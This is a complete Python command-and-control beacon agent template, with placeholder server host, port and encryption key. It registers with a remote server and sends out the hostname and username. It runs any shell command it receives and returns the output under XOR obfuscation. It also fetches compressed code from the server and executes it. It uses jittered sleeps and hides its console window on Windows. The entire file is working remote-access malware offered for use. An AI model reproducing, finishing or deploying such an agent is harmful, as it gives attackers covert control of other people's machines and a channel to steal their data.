#!/usr/bin/env python3
"""Minimal Beacon Agent - Staged Loading Architecture"""
import asyncio
import websockets
import json
import platform
import subprocess
import os
import getpass
import socket
import base64
import sys
import zlib

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
RECONNECT_DELAY = 5
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}


def simple_encrypt(data: str) -> str:
    """XOR encryption"""
    key = b'{{ENCRYPTION_KEY}}'
    encoded = data.encode()
    encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
    return base64.b64encode(encrypted).decode()


def simple_decrypt(data: str) -> str:
    """XOR decryption"""
    key = b'{{ENCRYPTION_KEY}}'
    decoded = base64.b64decode(data.encode())
    decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
    return decrypted.decode()


def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
    """Calculate sleep time with jitter applied"""
    if jitter_percent <= 0 or jitter_percent > 100:
        return float(base_interval)

    import random
    jitter_amount = base_interval * (jitter_percent / 100.0)
    min_sleep = base_interval - jitter_amount
    max_sleep = base_interval + jitter_amount
    return random.uniform(max(0, min_sleep), max_sleep)


def get_metadata():
    """Gather system metadata"""
    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version()
    }


def execute_command(command: str) -> str:
    """Execute system command and return output"""
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"

        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=os.getcwd()
        )

        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"

    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


async def load_streaming_module(module_code: str):
    """Load streaming module dynamically"""
    try:
        # Decompress module code
        compressed = base64.b64decode(module_code)
        decompressed = zlib.decompress(compressed)
        code = decompressed.decode()

        # Compile and execute module
        compiled = compile(code, '<streaming_module>', 'exec')
        module_globals = {}
        exec(compiled, module_globals)

        return module_globals.get('run_streaming_mode')
    except Exception as e:
        return None


async def beacon_mode(websocket, agent_id, beacon_interval, beacon_jitter, pending_results, pending_commands):
    """Execute beacon mode cycle"""
    # Wait for ack then send results
    print(f"[DEBUG] Beacon mode started for {agent_id}")
    await asyncio.sleep(0.1)

    # Step 1: Send any pending results from previous cycle
    if pending_results:
        for result in pending_results:
            try:
                encrypted_response = simple_encrypt(json.dumps(result))
                await websocket.send(encrypted_response)
            except Exception:
                pass
        pending_results.clear()

    # Step 2: Fetch all queued commands
    pending_commands.clear()
    upgrade_requested = False
    streaming_module = None

    while True:
        try:
            message = await asyncio.wait_for(websocket.recv(), timeout=2.0)
            decrypted = simple_decrypt(message)
            data = json.loads(decrypted)

            if data.get('type') == 'command':
                pending_commands.append({
                    'command': data.get('command', ''),
                    'timestamp': data.get('timestamp', '')
                })

            elif data.get('type') == 'set_interval':
                beacon_interval = data.get('interval', beacon_interval)

            elif data.get('type') == 'kill':
                # Exit agent
                print(f"[DEBUG] Kill command received, exiting...")
                import sys
                sys.exit(0)

            elif data.get('type') == 'upgrade_mode':
                # Receive streaming module
                streaming_module = data.get('module_code')
                upgrade_requested = True
                mode_msg = {
                    'type': 'mode_change',
                    'mode': 'streaming'
                }
                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                await websocket.send(encrypted_msg)
                break

        except asyncio.TimeoutError:
            break

    # If upgrade requested, load and run streaming module
    if upgrade_requested and streaming_module:
        streaming_func = await load_streaming_module(streaming_module)
        if streaming_func:
            # Run streaming mode with the loaded module
            return await streaming_func(websocket, agent_id, execute_command, simple_encrypt, simple_decrypt)
        else:
            # Failed to load module, continue as beacon
            pass

    # Step 3: Execute commands offline
    print(f"[DEBUG] Executing {len(pending_commands)} commands offline")
    for cmd_data in pending_commands:
        try:
            output = execute_command(cmd_data['command'])
            pending_results.append({
                'type': 'response',
                'output': output,
                'command': cmd_data['command'],
                'timestamp': cmd_data['timestamp']
            })
        except Exception as e:
            pending_results.append({
                'type': 'response',
                'output': f"Error executing command: {str(e)}",
                'command': cmd_data['command'],
                'timestamp': cmd_data['timestamp']
            })

    print(f"[DEBUG] Beacon mode complete, disconnecting to sleep")
    return beacon_interval, beacon_jitter


async def connect_to_server():
    """Main agent connection loop"""
    uri = f"ws://{SERVER_HOST}:{SERVER_PORT}"
    agent_id = None
    pending_results = []
    pending_commands = []
    beacon_interval = BEACON_INTERVAL
    beacon_jitter = BEACON_JITTER

    while True:
        try:
            async with websockets.connect(uri, max_size=10485760) as websocket:
                metadata = get_metadata()
                metadata['mode'] = 'beacon'
                metadata['beacon_interval'] = beacon_interval
                metadata['beacon_jitter'] = beacon_jitter

                # Register or checkin
                if agent_id:
                    checkin_msg = {
                        'type': 'checkin',
                        'agent_id': agent_id,
                        'metadata': metadata
                    }
                    encrypted = simple_encrypt(json.dumps(checkin_msg))
                else:
                    register_msg = {
                        'type': 'register',
                        'metadata': metadata
                    }
                    encrypted = simple_encrypt(json.dumps(register_msg))

                await websocket.send(encrypted)

                response = await websocket.recv()
                decrypted = simple_decrypt(response)
                reg_data = json.loads(decrypted)

                if reg_data.get('type') in ['registered', 'checkin_ack']:
                    # Always update agent_id if server sends one (handles server restart case)
                    new_id = reg_data.get('agent_id')
                    if new_id and new_id != agent_id:
                        print(f"[DEBUG] Agent ID updated: {agent_id} -> {new_id}")
                        agent_id = new_id

                    if reg_data.get('type') == 'registered':
                        print(f"[DEBUG] Registered with ID: {agent_id}")
                    else:
                        print(f"[DEBUG] Checked in with ID: {agent_id}")

                    # Run beacon cycle (may return if upgraded to streaming)
                    result = await beacon_mode(websocket, agent_id, beacon_interval,
                                              beacon_jitter, pending_results, pending_commands)

                    # If returned from streaming mode, it means we downgraded
                    if isinstance(result, tuple):
                        beacon_interval, beacon_jitter = result
                        print(f"[DEBUG] Beacon cycle complete, sleeping for {calculate_sleep_time(beacon_interval, beacon_jitter):.1f}s")

        except Exception as e:
            # Debug: print errors (comment out for production)
            import traceback
            print(f"[DEBUG] Connection error: {e}")
            traceback.print_exc()

        # Sleep for beacon interval (with jitter)
        sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
        await asyncio.sleep(sleep_time)


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    try:
        asyncio.run(connect_to_server())
    except KeyboardInterrupt:
        pass
